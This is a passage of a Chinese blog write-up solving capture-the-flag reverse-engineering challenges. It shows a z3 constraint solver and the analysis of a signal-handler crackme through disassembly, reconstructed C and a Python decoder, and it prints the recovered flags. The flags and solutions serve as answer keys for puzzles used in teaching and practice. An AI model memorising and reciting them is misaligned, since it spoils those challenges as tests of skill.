class="number">0x11E28ED873</span>,</span><br><span class="line">  v2 + <span class="number">4</span> * (v4 + v3 + <span class="number">2</span> * v5) + <span class="number">9</span> * v6 + v7 + <span class="number">3</span> * v8 == <span class="number">0xB353C03E1</span></span><br><span class="line">]</span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">  solver.add(constraint)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">  model = solver.model()</span><br><span class="line">  Flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(model.evaluate(chars[i]).as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, Flag)</span><br></pre></td></tr></table></figure>
<p>输出<font color=deepskyblue><strong>flag{D0_Y0u_Kn0w_sMC_4nD_Z3}</strong></font>.</p>
<h3 id="取啥名好呢？："><a href="#取啥名好呢？：" class="headerlink" title="取啥名好呢？："></a>取啥名好呢？：</h3><p>打开发现main函数无法被反编译，而多出来一个mian函数，内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mian</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  signal(<span class="number">8</span>, handler_func1);	<span class="comment">//SIGFPE (8): 浮点异常（Floating Point Exception）</span></span><br><span class="line">  signal(<span class="number">11</span>, handler_func2);	<span class="comment">//SIGSEGV (11): 段错误（Segmentation Fault）</span></span><br><span class="line">  signal(<span class="number">4</span>, handler);		<span class="comment">//SIGILL (4): 非法指令（Illegal Instruction）</span></span><br><span class="line">  signal(<span class="number">2</span>, handler_func3);	<span class="comment">//SIGINT (2): 中断信号（Interrupt）</span></span><br><span class="line">  signal(<span class="number">14</span>, handler_func4);	<span class="comment">//SIGALRM (14): 报警信号（Alarm Clock）</span></span><br><span class="line">  signal(<span class="number">6</span>, handler_func5);	<span class="comment">//SIGABRT (6): 程序异常终止（Abort）</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;hellooooo!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推测程序会在触发这些信号时调用对应的函数，再观察后面的handler，发现只有func1可能是应当被调用的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handler_func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  byte_4150[dword_4168] ^= dword_4168;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4168 == <span class="number">22</span> )</span><br><span class="line">    sub_12E9();</span><br><span class="line">  ++dword_4168;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>func1会将数组<font color=red><strong>byte_4150</strong></font>的第<font color=red><strong>dword_4168</strong></font>个值与<font color=red><strong>dword_4168</strong></font>的值进行异或，当<font color=red><strong>dword_4168</strong></font>的值为22时，调用函数<font color=red><strong>sub_12E9</strong></font>，再将其本身加上1，而<font color=red><strong>sub_12E9</strong></font>就是最终的比较函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_12E9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;unk_4010, byte_4150, <span class="number">0x17u</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aO);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_12E9</code>会将加密的输入值与加密的flag的前23个字节（也就是flag的长度）进行比较，而加密的flag为<font color=lime><strong>[0x4F, 0x54, 0x48, 0x53, 0x60, 0x45, 0x37, 0x1A, 0x28, 0x41, 0x26, 0x16, 0x3B, 0x45, 0x14, 0x47, 0x0E, 0x0C, 0x70, 0x3B, 0x3C, 0x3D, 0x70]</strong></font>，不过到此为止我们只找到了一个简单的异或加密和最终的比较部分，main函数和读取输入的部分并未发现，于是转到_start函数再点击main，发现main会维持汇编代码，尝试按u将main全部转为机器码再按p，发现仍然不能转变，进行手动分析：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span> <span class="comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span>                 <span class="meta">public</span> main</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span> main:                                   <span class="comment">; DATA XREF: _start+18↑o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001983</span>                 endbr64</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001987</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001988</span>                 <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000198B                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000198F                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, aInputYourFlag <span class="comment">; &quot;input your flag:&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001996</span>                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001999</span>                 <span class="keyword">call</span>    _puts</span><br><span class="line"><span class="symbol">.text:</span>000000000000199E                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, byte_4150</span><br><span class="line"><span class="symbol">.text:</span>00000000000019A5                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019A8                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, a23s       <span class="comment">; &quot;%23s&quot;			--&gt;	这里读取了输入的23个字符并存入byte_4150</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019AF                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019B2                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019B7                 <span class="keyword">call</span>    ___isoc99_scanf</span><br><span class="line"><span class="symbol">.text:</span>00000000000019BC                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, env</span><br><span class="line"><span class="symbol">.text:</span>00000000000019C3                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019C6                 <span class="keyword">call</span>    __setjmp					--&gt;	询问ai得知这里设置了恢复点，在信号处理完成后能恢复程序的状态</span><br><span class="line"><span class="symbol">.text:</span>00000000000019CB                 endbr64</span><br><span class="line"><span class="symbol">.text:</span>00000000000019CF                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">4</span>          <span class="comment">; switch 5 cases</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019D2                 <span class="keyword">ja</span>      short def_19F4  <span class="comment">; jumptable 00000000000019F4 default case</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019D4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019D6                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, <span class="built_in">ds</span>:<span class="number">0</span>[<span class="built_in">rax</span>*<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000000000019DE                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, jpt_19F4</span><br><span class="line"><span class="symbol">.text:</span>00000000000019E5                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ds</span>:(jpt_19F4 - <span class="number">2100h</span>)[<span class="built_in">rdx</span>+<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000000000019E8                 <span class="keyword">cdqe</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019EA                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, jpt_19F4</span><br><span class="line"><span class="symbol">.text:</span>00000000000019F1                 <span class="keyword">add</span>     <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F4                 <span class="built_in">db</span>      <span class="number">3Eh</span>             <span class="comment">; switch jump</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F4                 <span class="keyword">jmp</span>     <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F7 <span class="comment">; ---------------------------------------------------------------------------		--&gt;	不同的case</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F7</span><br><span class="line"><span class="symbol">.text:</span>00000000000019F7 loc_19F7:                               <span class="comment">; CODE XREF: .text:00000000000019F4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F7                                         <span class="comment">; DATA XREF: .rodata:jpt_19F4↓o</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019F7                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:qword_4060 <span class="comment">; jumptable 00000000000019F4 case 0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000019FE                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="number">1BF52h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A04                 <span class="keyword">jmp</span>     short loc_1A4D</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A06 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A06</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A06 loc_1A06:                               <span class="comment">; CODE XREF: .text:00000000000019F4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A06                                         <span class="comment">; DATA XREF: .rodata:jpt_19F4↓o</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A06                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:qword_4060 <span class="comment">; jumptable 00000000000019F4 case 1</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A0D                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>], <span class="number">0E9h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A13                 <span class="keyword">jmp</span>     short loc_1A4D</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15 loc_1A15:                               <span class="comment">; CODE XREF: .text:00000000000019F4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15                                         <span class="comment">; DATA XREF: .rodata:jpt_19F4↓o</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">4</span>          <span class="comment">; jumptable 00000000000019F4 case 2</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A15 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A1A                 <span class="built_in">dw</span> <span class="number">2</span> dup(<span class="number">0FFFFh</span>), <span class="number">0EBFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A20                 <span class="built_in">db</span> <span class="number">2Ch</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A21 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A21</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A21 loc_1A21:                               <span class="comment">; CODE XREF: .text:00000000000019F4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A21                                         <span class="comment">; DATA XREF: .rodata:jpt_19F4↓o</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A21                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">0</span>          <span class="comment">; jumptable 00000000000019F4 case 3</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A26                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A2B                 <span class="keyword">call</span>    handler_func5</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A30                 <span class="keyword">jmp</span>     short loc_1A4D</span><br><span class="line"><span class="symbol">.text:</span>0000000000001<span class="built_in">A32</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001<span class="built_in">A32</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001<span class="built_in">A32</span> loc_1A32:                               <span class="comment">; CODE XREF: .text:00000000000019F4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001<span class="built_in">A32</span>                                         <span class="comment">; DATA XREF: .rodata:jpt_19F4↓o</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001<span class="built_in">A32</span>                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="number">18h</span>        <span class="comment">; jumptable 00000000000019F4 case 4</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A37                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A3C                 <span class="keyword">call</span>    handler_func4</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A41                 <span class="keyword">jmp</span>     short loc_1A4D</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A43 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A43</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A43 def_19F4:                               <span class="comment">; CODE XREF: .text:00000000000019D2↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A43                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="number">0</span>          <span class="comment">; jumptable 00000000000019F4 default case</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A48                 <span class="keyword">call</span>    _exit</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A4D <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A4D</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A4D loc_1A4D:                               <span class="comment">; CODE XREF: .text:0000000000001A04↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A4D                                         <span class="comment">; .text:0000000000001A13↑j ...</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A4D                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">4</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A54                 <span class="keyword">jmp</span>     short loc_1A85</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A56 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A56</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A56 loc_1A56:                               <span class="comment">; CODE XREF: .text:0000000000001A89↓j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A56                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A59                 <span class="keyword">cdqe</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A5B                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, byte_4150</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A62                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rdx</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A66                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A68                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">cs</span>:dword_4068				--&gt;	for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 23; i++) &#123;byte_4150[i] += dword_4068;&#125;</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A6E                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A70                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A72                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A75                 <span class="keyword">cdqe</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A77                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, byte_4150</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A7E                 <span class="keyword">mov</span>     [<span class="built_in">rax</span>+<span class="built_in">rdx</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A81                 <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">4</span>], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A85</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A85 loc_1A85:                               <span class="comment">; CODE XREF: .text:0000000000001A54↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A85                 <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>-<span class="number">4</span>], <span class="number">16h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A89                 <span class="keyword">jle</span>     short loc_1A56</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A8B                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A90                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A95                 <span class="keyword">cdq</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A96                 <span class="keyword">idiv</span>    <span class="built_in">ecx</span>						--&gt;	<span class="number">1</span>/<span class="number">0</span>引发SIGFPE浮点异常，调用func1</span><br><span class="line"><span class="symbol">.text:</span>0000000000001A98                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001A9A                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, aYouShouldNever <span class="comment">; &quot;You should never read this in program o&quot;...</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AA1                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AA4                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AA9                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span>0000000000001AAE                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AB3                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AB4                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000001AB4 <span class="comment">; &#125; // starts at 1983</span></span><br></pre></td></tr></table></figure>
<p>手动转为大致的C语言代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%23s&quot;</span>, byte_4150);</span><br><span class="line">    信号处理结束后的程序恢复点;</span><br><span class="line">    切换各种情况;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">23</span>; i++) &#123;</span><br><span class="line">        byte_4150[i] += dword_4068;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span> / <span class="number">0</span>;  <span class="comment">// 除以零，触发SIGFPE来进行后续的处理和比对</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You should never read this in program output,why???\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么程序的运行逻辑已经很明确了，只是简单的读取了输入的23个字符，然后每个字符值加上了<font color=red><strong>dword_4068</strong></font>，接着除以0引发信号8转入<code>func1</code>，再将数组<font color=red><strong>byte_4150</strong></font>的第<font color=red><strong>dword_4168</strong></font>个值与<font color=red><strong>dword_4168</strong></font>的值进行异或，而<font color=red><strong>dword_4168</strong></font>的值的波动则在<code>main</code>函数的switch case中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (dword_4168) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            dword_4168 = <span class="number">0x1BF52</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            dword_4168 = <span class="number">0xE9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            dword_4168 = <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            handler_func5(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            handler_func4(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>和func1中的<font color=red><strong>++dword_4168</strong></font>体现，当<font color=red><strong>dword_4168</strong></font>的值为22时，调用函数<font color=red><strong>sub_12E9</strong></font>进行比较，接下来进行动态调试，发现<font color=red><strong>dword_4068</strong></font>是定值<code>0xE9</code>，相当于每个字符的十六进制ASCII值加上0xE9强制转换byte，接下来在第二次异或的时候输入值的1-23个字符每次异或的值分别是0-22，倒推得到原来的十六进制字符<font color=lime><strong>[0x66, 0x6C, 0x61, 0x67, 0x7B, 0x57, 0x48, 0x34, 0x37, 0x5F, 0x43, 0x34, 0x4E, 0x5F, 0x31, 0x5F, 0x35, 0x34, 0x79, 0x3F, 0x3F, 0x3F, 0x7D]</strong></font>和<font color=deepskyblue><strong>flag{WH47_C4N_1_54y???}</strong></font>.</p>
<p>附Python代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x4F</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x53</span>, <span class="number">0x60</span>, <span class="number">0x45</span>, <span class="number">0x37</span>, <span class="number">0x1A</span>, <span class="number">0x28</span>, <span class="number">0x41</span>, <span class="number">0x26</span>, <span class="number">0x16</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x70</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0x70</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">  enc_flag[i] ^= i</span><br><span class="line">  enc_flag[i] -= <span class="number">0xE9</span></span><br><span class="line">  enc_flag[i] &amp;= <span class="number">0xFF</span></span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br></pre></td></tr></table></figure>

